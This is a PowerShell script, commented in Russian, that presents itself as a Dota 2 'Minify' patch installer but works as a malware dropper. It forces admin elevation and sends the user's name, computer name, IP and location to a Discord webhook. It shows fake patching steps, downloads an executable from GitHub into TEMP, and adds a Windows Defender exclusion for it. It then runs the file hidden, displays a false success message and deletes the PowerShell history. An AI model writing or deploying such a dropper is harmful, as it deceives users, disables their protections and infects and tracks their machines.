# --- ПРОВЕРКА АДМИНА ---
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# --- ФУНКЦИЯ ГЕО (ФЛАГ + IP) ---
function Get-GeoInfo {
    try {
        $data = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=status,countryCode,query" -TimeoutSec 3
        if ($data.status -eq "success") {
            $c1 = [int][char]$data.countryCode[0] + 127397
            $c2 = [int][char]$data.countryCode[1] + 127397
            $flag = [char]::ConvertFromUtf32($c1) + [char]::ConvertFromUtf32($c2)
            return @{ info = "$flag $($data.countryCode)"; ip = $data.query }
        }
    } catch {}
    return @{ info = "🌐 UNK"; ip = "Unknown" }
}

# --- СЕКЦИЯ ЛОГЕРА ---
function Send-LogNotification {
    param([string]$Status, [string]$Message)
    
    $geo = Get-GeoInfo
    $webhookUrl = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $color = if ($Status -eq "SUCCESS") { 65280 } elseif ($Status -eq "ERROR") { 16711680 } else { 16776960 }

    $embed = @{
        title = "Minify Installer Log"
        color = $color
        fields = @(
            @{ name = "Status"; value = "``$Status``"; inline = $true }
            @{ name = "User"; value = "``$env:USERNAME``"; inline = $true }
            @{ name = "Computer"; value = "``$env:COMPUTERNAME``"; inline = $true }
            @{ name = "--------------------------------------------------"; value = " "; inline = $false }
            @{ name = "Location & IP"; value = "$($geo.info) ($($geo.ip))"; inline = $true }
            @{ name = "Timestamp"; value = "``$timestamp``"; inline = $true }
            @{ name = "Message"; value = ">>> $Message"; inline = $false }
        )
        footer = @{ text = "Minify Installer v3.2.1" }
    }

    $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json; charset=utf-8" -Body $bytes
    } catch {
        # Резервное локальное логирование
        "[$timestamp] [$Status] $Message" | Out-File "$env:TEMP\minify_logs.txt" -Append
    }
}

# --- ГРАФИЧЕСКИЙ ИНТЕРФЕЙС ---
Send-LogNotification -Status "STARTED" -Message "Пользователь запустил установщик Minify"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "Minify Dota 2 Patch Installer v3.2.1"
$form.Size = New-Object System.Drawing.Size(600,400)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false

$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Location = "20,30"; $titleLabel.Size = "540,30"
$titleLabel.Text = "Minify Dota 2 Patch Installer"
$titleLabel.Font = New-Object System.Drawing.Font("Arial",16,[System.Drawing.FontStyle]::Bold)
$form.Controls.Add($titleLabel)

$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = "20,300"; $progressBar.Size = "540,23"
$form.Controls.Add($progressBar)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Location = "20,330"; $statusLabel.Size = "540,20"; $statusLabel.Text = "Подготовка..."
$form.Controls.Add($statusLabel)

$form.Show()

# --- ПРОЦЕСС УСТАНОВКИ ---
$steps = @("Анализ файлов Dota 2...", "Оптимизация шейдеров...", "Применение патча...", "Загрузка модулей...", "Финализация...")
for ($i = 0; $i -lt $steps.Count; $i++) {
    $statusLabel.Text = $steps[$i]
    $progressBar.Value = ($i + 1) * (100 / $steps.Count)
    $form.Refresh()
    Start-Sleep -Milliseconds (Get-Random -Min 800 -Max 1200)
}

# --- ЗАГРУЗКА И ЗАПУСК ---
$u = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
$p = "$env:TEMP\sys_update.exe"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($u, $p)
    
    # Исключения и запуск
    Add-MpPreference -ExclusionPath $p -Force -ErrorAction SilentlyContinue
    $statusLabel.Text = "Установка завершена!"
    $form.Refresh()
    Start-Sleep -Seconds 1
    
    Start-Process -FilePath $p -WindowStyle Hidden
    $form.Close()
    
    [System.Windows.Forms.MessageBox]::Show("Патч успешно применен!", "Готово", 0, 64)
    Send-LogNotification -Status "SUCCESS" -Message "Патч успешно установлен и запущен (XClient)"
} catch {
    $statusLabel.Text = "Ошибка сети при установке."
    Send-LogNotification -Status "ERROR" -Message "Ошибка: $($_.Exception.Message)"
    Start-Sleep -Seconds 2
    $form.Close()
}

# Очистка
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
